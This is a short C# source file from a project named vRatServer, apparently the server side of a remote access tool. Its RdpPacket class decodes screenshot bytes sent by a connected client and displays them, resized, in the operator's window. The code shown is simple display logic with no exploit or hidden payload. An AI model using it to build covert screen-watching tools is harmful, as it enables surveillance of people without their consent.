using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using vRatServer.Classes;

namespace vRatServer.Packets
{
    class RdpPacket
    {
        Client client;
        byte[] data;

        void updateImage()
        {
            Program.f1.Invoke((MethodInvoker)delegate
            {



                if (client.cf == null) { return; }
                using (MemoryStream ms = new MemoryStream(data))
                {
                    Image img = Image.FromStream(ms);
                    Size client_mon_size = img.Size;
                    //img.Save("test.jpg");

                    client.ScreenX = img.Size.Width;
                    client.ScreenY = img.Size.Height;

                    Bitmap resizedImg = new Bitmap(img, new Size(client.cf.pictureBox1.Width, client.cf.pictureBox1.Height));

                    client.cf.pictureBox1.Image = resizedImg;


                }




            });
            

            
        }
        public RdpPacket(Classes.Client client, byte[] data)
        {

            this.client = client;
            this.data = data;
            updateImage();

        }
    }
}
